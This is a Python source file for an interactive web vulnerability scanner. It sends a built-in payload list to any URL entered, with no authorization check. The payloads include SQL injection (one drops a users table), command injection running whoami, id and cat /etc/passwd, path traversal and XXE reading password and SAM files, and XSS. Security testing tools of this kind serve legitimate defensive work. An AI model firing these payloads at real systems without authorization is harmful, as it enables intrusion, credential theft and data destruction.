"""
Zero-Day Scanner - Interactive vulnerability scanner for target URLs
=====================================================================
Performs advanced reconnaissance and vulnerability detection on targets.
"""

import requests
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin
from core.zero_day_engine import ZeroDayDetectionEngine, ZeroDayFinding
import sys


class ZeroDayScanner:
    """Interactive zero-day scanner for target URLs."""
    
    def __init__(self, timeout: int = 30, verbose: bool = True):
        self.timeout = timeout
        self.verbose = verbose
        self.engine = ZeroDayDetectionEngine()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def log(self, message: str, level: str = "INFO"):
        """Log message with level indicator."""
        if self.verbose:
            timestamp = time.strftime("%H:%M:%S")
            print(f"[{timestamp}] [{level}] {message}")
    
    def validate_url(self, url: str) -> Tuple[bool, str]:
        """Validate and normalize URL."""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        try:
            result = urlparse(url)
            if not result.netloc:
                return False, "Invalid URL format"
            return True, url
        except Exception as e:
            return False, str(e)
    
    def fetch_baseline(self, url: str) -> Optional[Dict]:
        """Fetch baseline response for comparison."""
        self.log(f"Fetching baseline response from {url}")
        try:
            response = self.session.get(url, timeout=self.timeout)
            return {
                'content': response.text,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'response_time': response.elapsed.total_seconds()
            }
        except Exception as e:
            self.log(f"Failed to fetch baseline: {str(e)}", "ERROR")
            return None
    
    def generate_test_payloads(self) -> List[str]:
        """Generate comprehensive test payloads."""
        payloads = [
            # SQL Injection
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "1'; DROP TABLE users--",
            "' OR 1=1--",
            
            # Command Injection
            "; ls -la",
            "| whoami",
            "` cat /etc/passwd `",
            "$(id)",
            
            # Path Traversal
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2fetc%2fpasswd",
            
            # XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            
            # LDAP Injection
            "*)(uid=*",
            "*",
            
            # XSS
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror='alert(1)'>",
            
            # Template Injection
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
            
            # SSTI
            "${IFS}cat${IFS}/etc/passwd",
            "#{7*7}",
            "*{7*7}",
        ]
        return payloads
    
    def test_parameter(self, base_url: str, param_name: str, payloads: List[str]) -> Tuple[List[Dict], str]:
        """Test a specific parameter with payloads."""
        responses = []
        parameter_str = f"{param_name}="
        
        self.log(f"Testing parameter: {param_name}")
        
        for i, payload in enumerate(payloads):
            try:
                # Test as GET parameter
                test_url = f"{base_url}?{param_name}={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                responses.append({
                    'content': response.text,
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'response_time': response.elapsed.total_seconds(),
                    'url': test_url,
                    'payload': payload
                })
                
                self.log(f"  [{i+1}/{len(payloads)}] Status: {response.status_code} | "
                        f"Size: {len(response.text)} bytes | Time: {response.elapsed.total_seconds():.3f}s")
                
                time.sleep(0.1)  # Rate limiting
                
            except Exception as e:
                self.log(f"  [{i+1}/{len(payloads)}] Error: {str(e)}", "WARNING")
                time.sleep(0.2)
        
        return responses, parameter_str
    
    def detect_parameters(self, url: str) -> List[str]:
        """Detect vulnerable parameters in URL."""
        # Common vulnerable parameters
        common_params = [
            'id', 'user', 'username', 'email', 'search', 'q', 'query',
            'filter', 'sort', 'page', 'page_id', 'file', 'path', 'url',
            'redirect', 'return', 'next', 'ref', 'referrer',
            'category', 'tag', 'name', 'lang', 'locale', 'format'
        ]
        
        detected = []
        
        # Check URL for existing parameters
        if '?' in url:
            params = url.split('?')[1].split('&')
            for param in params:
                if '=' in param:
                    detected.append(param.split('=')[0])
        
        # If no parameters found, suggest common ones
        if not detected:
            detected = common_params[:5]
            self.log(f"No parameters detected. Testing common ones: {', '.join(detected)}")
        
        return detected
    
    def scan_target(self, url: str, verbose_output: bool = True) -> Dict:
        """
        Scan target URL for zero-day vulnerabilities.
        
        Args:
            url: Target URL to scan
            verbose_output: Print detailed progress
            
        Returns:
            Scan report dictionary
        """
        self.log("=" * 70)
        self.log(f"Starting Zero-Day Vulnerability Scan on {url}")
        self.log("=" * 70)
        
        # Validate URL
        is_valid, normalized_url = self.validate_url(url)
        if not is_valid:
            self.log(f"Invalid URL: {normalized_url}", "ERROR")
            return {"status": "failed", "error": normalized_url}
        
        url = normalized_url
        
        # Fetch baseline
        baseline = self.fetch_baseline(url)
        if not baseline:
            return {"status": "failed", "error": "Could not fetch baseline response"}
        
        self.log(f"Baseline response: {baseline['status_code']} | "
                f"Size: {len(baseline['content'])} bytes | "
                f"Time: {baseline['response_time']:.3f}s")
        
        # Detect parameters
        parameters = self.detect_parameters(url)
        self.log(f"Detected {len(parameters)} parameter(s) to test")
        
        # Generate payloads
        payloads = self.generate_test_payloads()
        self.log(f"Generated {len(payloads)} test payload(s)")
        
        all_findings = []
        all_responses = []
        
        # Test each parameter
        for param in parameters:
            self.log(f"\n>>> Testing parameter: {param} <<<")
            responses, param_str = self.test_parameter(url, param, payloads)
            
            if responses:
                all_responses.extend(responses)
                
                # Analyze responses
                findings = self.engine.scan_for_unknown_vulns(
                    responses=responses,
                    payloads=payloads,
                    baseline_response=baseline['content'],
                    request_context={'parameter': param}
                )
                
                all_findings.extend(findings)
                
                self.log(f"Found {len(findings)} anomalies for parameter '{param}'")
        
        # Generate final report
        report = self.engine.generate_report(all_findings)
        report['url'] = url
        report['scan_timestamp'] = time.time()
        report['parameters_tested'] = len(parameters)
        report['payloads_tested'] = len(payloads)
        report['total_requests'] = len(all_responses)
        
        self.log("\n" + "=" * 70)
        self.log("Scan Complete")
        self.log("=" * 70)
        self.print_report(report)
        
        return report
    
    def print_report(self, report: Dict):
        """Print formatted scan report."""
        print(f"\n{'='*70}")
        print(f"SCAN REPORT FOR: {report.get('url', 'Unknown')}")
        print(f"{'='*70}")
        
        print(f"\nStatistics:")
        print(f"  • Total Requests: {report.get('total_requests', 0)}")
        print(f"  • Parameters Tested: {report.get('parameters_tested', 0)}")
        print(f"  • Payloads Tested: {report.get('payloads_tested', 0)}")
        
        print(f"\nFindings Summary:")
        print(f"  • Critical: {report.get('critical_count', 0)}")
        print(f"  • High: {report.get('high_count', 0)}")
        print(f"  • Medium: {report.get('medium_count', 0)}")
        print(f"  • Low: {report.get('low_count', 0)}")
        print(f"  • Total: {report.get('total_findings', 0)}")
        
        if report.get('findings'):
            print(f"\nDetailed Findings:")
            for i, finding in enumerate(report['findings'], 1):
                print(f"\n  [{i}] {finding['type']}")
                print(f"      Severity: {finding['severity']} | Confidence: {finding['confidence']:.1%}")
                print(f"      Indicators:")
                for indicator in finding.get('indicators', [])[:3]:
                    print(f"        - {indicator}")
                if finding.get('recommendation'):
                    print(f"      Recommendation: {finding['recommendation']}")
        else:
            print(f"\n✓ No vulnerabilities detected during scan")
        
        print(f"\n{'='*70}\n")


def interactive_zero_day_scanner():
    """Run interactive zero-day scanner."""
    print("\n" + "="*70)
    print("Zero-Day Vulnerability Scanner - Interactive Mode")
    print("="*70)
    
    scanner = ZeroDayScanner(verbose=True)
    
    while True:
        try:
            url = input("\n[*] Enter target URL (or 'quit' to exit): ").strip()
            
            if url.lower() in ['quit', 'exit', 'q']:
                print("\n[+] Exiting scanner. Goodbye!")
                break
            
            if not url:
                print("[!] URL cannot be empty")
                continue
            
            report = scanner.scan_target(url)
            
            if report.get('status') == 'failed':
                print(f"[!] Scan failed: {report.get('error')}")
            
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")
            break
        except Exception as e:
            print(f"[!] Unexpected error: {str(e)}")
            continue


if __name__ == '__main__':
    interactive_zero_day_scanner()
